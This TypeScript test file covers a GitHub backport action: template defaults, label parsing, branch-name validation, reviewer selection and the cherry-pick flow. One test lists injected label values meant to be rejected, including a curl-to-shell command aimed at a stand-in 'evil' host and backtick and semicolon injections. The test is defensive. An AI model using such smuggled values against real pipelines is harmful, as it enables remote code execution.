import { strict as assert } from "node:assert";
import { readFile } from "node:fs/promises";
import type { PullRequestClosedEvent } from "@octokit/webhooks-types";
import { template } from "lodash-es";
import { describe, it } from "node:test";
import type { Git, Github } from "./backport.js";
import {
  backportOnce,
  getBaseBranches,
  getReviewers,
  isSafeBranchName,
} from "./backport.js";

const labelRegExp = /^auto-backport-to-(?<base>([^ ]+))$/;

const closedPayload = (labels: string[]) =>
  ({
    action: "closed",
    pull_request: { labels: labels.map((name) => ({ name })) },
  } as unknown as PullRequestClosedEvent);

type Call = { parameters: { [key: string]: unknown }; route: string };

const fakeGithub = ({
  existingPullRequests = [],
  failingRoutes = [],
}: {
  existingPullRequests?: Array<{ number: number }>;
  failingRoutes?: string[];
} = {}) => {
  const calls: Call[] = [];
  const github = {
    async request(route: string, parameters: { [key: string]: unknown }) {
      calls.push({ parameters, route });
      if (failingRoutes.some((failing) => route.includes(failing))) {
        throw new Error(`${route} failed`);
      }

      if (route.startsWith("GET /repos/{owner}/{repo}/pulls")) {
        return { data: existingPullRequests };
      }

      return { data: { number: 42 } };
    },
  } as unknown as Github;
  return { calls, github };
};

const fakeGit = ({
  failing = [],
  remoteBranchExists = false,
}: { failing?: string[]; remoteBranchExists?: boolean } = {}) => {
  const calls: string[] = [];
  const git: Git = async (args, { ignoreReturnCode = false } = {}) => {
    const command = args.join(" ");
    calls.push(command);
    if (args[0] === "ls-remote") {
      return remoteBranchExists ? 0 : 2;
    }

    if (failing.some((prefix) => command.startsWith(prefix))) {
      if (ignoreReturnCode) {
        return 1;
      }

      throw new Error(`git ${command} failed`);
    }

    return 0;
  };

  return { calls, git };
};

const options = {
  author: "contributor",
  base: "17.x",
  body: "body",
  commitSha: "abc123",
  head: "backport-1-to-17.x",
  labels: ["bug", "backport"],
  mergedBy: "maintainer",
  owner: "owner",
  repo: "repo",
  title: "title",
};

describe("default templates", async () => {
  const actionYml = await readFile(
    new URL("../action.yml", import.meta.url),
    "utf8",
  );
  const getDefault = (input: string) => {
    const match = new RegExp(`${input}:[\\s\\S]*?default: "(.*)"`).exec(
      actionYml,
    );
    if (!match?.[1]) {
      throw new Error(`No default for ${input}.`);
    }

    return template(match[1]);
  };

  it("keeps the original body verbatim", () => {
    const body = 'Don\'t <b>escape</b> & "quote"';
    const rendered = getDefault("body_template")({
      base: "17.x",
      body,
      mergeCommitSha: "abc123",
      number: 1,
    });
    assert.ok(rendered.endsWith(body), rendered);
    assert.ok(!rendered.includes("&#39;"), rendered);
  });

  it("keeps the original title verbatim", () => {
    assert.equal(
      getDefault("title_template")({
        base: "17.x",
        number: 1,
        title: "fix: don't break",
      }),
      "fix: don't break (backport to 17.x)",
    );
  });
});

describe("getBaseBranches", () => {
  it("extracts the base branches from the labels", () => {
    assert.deepEqual(
      getBaseBranches({
        labelRegExp,
        payload: closedPayload([
          "bug",
          "auto-backport-to-16.x",
          "auto-backport-to-17.x",
        ]),
      }),
      ["16.x", "17.x"],
    );
  });

  it("rejects labels that would inject options or shell syntax", () => {
    for (const label of [
      "auto-backport-to---orphan=x",
      // eslint-disable-next-line no-template-curly-in-string
      "auto-backport-to-x$(curl${IFS}evil|sh)",
      "auto-backport-to-x`id`",
      "auto-backport-to-x;id",
    ]) {
      assert.throws(
        () => getBaseBranches({ labelRegExp, payload: closedPayload([label]) }),
        /unsafe branch name/,
        label,
      );
    }
  });
});

describe("isSafeBranchName", () => {
  it("accepts usual branch names", () => {
    for (const name of [
      "main",
      "17.x",
      "release/v18.4",
      "backport-12-to-17.x",
    ]) {
      assert.ok(isSafeBranchName(name), name);
    }
  });

  it("rejects invalid branch names", () => {
    for (const name of ["-x", "a..b", "a/", "a.lock", "a b", "a@{1}", "a//b"]) {
      assert.ok(!isSafeBranchName(name), name);
    }
  });
});

describe("getReviewers", () => {
  it("requests both the author and the merger", () => {
    assert.deepEqual(getReviewers({ author: "a", mergedBy: "b" }), ["a", "b"]);
  });

  it("deduplicates and skips bots and empty logins", () => {
    assert.deepEqual(getReviewers({ author: "a", mergedBy: "a" }), ["a"]);
    assert.deepEqual(getReviewers({ author: "a", mergedBy: "" }), ["a"]);
    assert.deepEqual(
      getReviewers({ author: "dependabot[bot]", mergedBy: "b" }),
      ["b"],
    );
  });
});

describe("backportOnce", () => {
  it("cherry-picks, pushes and creates the PR", async () => {
    const { calls: gitCalls, git } = fakeGit();
    const { calls, github } = fakeGithub();
    assert.equal(await backportOnce({ ...options, git, github }), 42);
    assert.deepEqual(gitCalls, [
      "ls-remote --exit-code --heads origin backport-1-to-17.x",
      "switch 17.x",
      "switch --create backport-1-to-17.x",
      "cherry-pick -x abc123",
      "push --set-upstream origin backport-1-to-17.x",
    ]);
    assert.deepEqual(
      calls.map(({ route }) => route.split(" ")[0]),
      ["GET", "POST", "POST", "POST", "PUT"],
    );
  });

  it("succeeds when decorating the created PR fails", async () => {
    const { git } = fakeGit();
    const { calls, github } = fakeGithub({
      failingRoutes: ["requested_reviewers", "assignees"],
    });
    assert.equal(await backportOnce({ ...options, git, github }), 42);
    assert.ok(calls.some(({ route }) => route.endsWith("/labels")));
  });

  it("returns the existing PR instead of failing on reruns", async () => {
    const { calls: gitCalls, git } = fakeGit();
    const { calls, github } = fakeGithub({
      existingPullRequests: [{ number: 7 }],
    });
    assert.equal(await backportOnce({ ...options, git, github }), 7);
    assert.deepEqual(gitCalls, []);
    assert.equal(calls.length, 1);
  });

  it("reuses a branch left over by a previous run", async () => {
    const { calls: gitCalls, git } = fakeGit({ remoteBranchExists: true });
    const { github } = fakeGithub();
    assert.equal(await backportOnce({ ...options, git, github }), 42);
    assert.deepEqual(gitCalls, [
      "ls-remote --exit-code --heads origin backport-1-to-17.x",
    ]);
  });

  it("reports the cherry-pick error even when aborting fails", async () => {
    const { calls: gitCalls, git } = fakeGit({
      failing: ["cherry-pick"],
    });
    const { github } = fakeGithub();
    await assert.rejects(
      backportOnce({ ...options, git, github }),
      /git cherry-pick -x abc123 failed/,
    );
    assert.ok(gitCalls.includes("cherry-pick --abort"));
    assert.ok(!gitCalls.some((call) => call.startsWith("push")));
  });
});
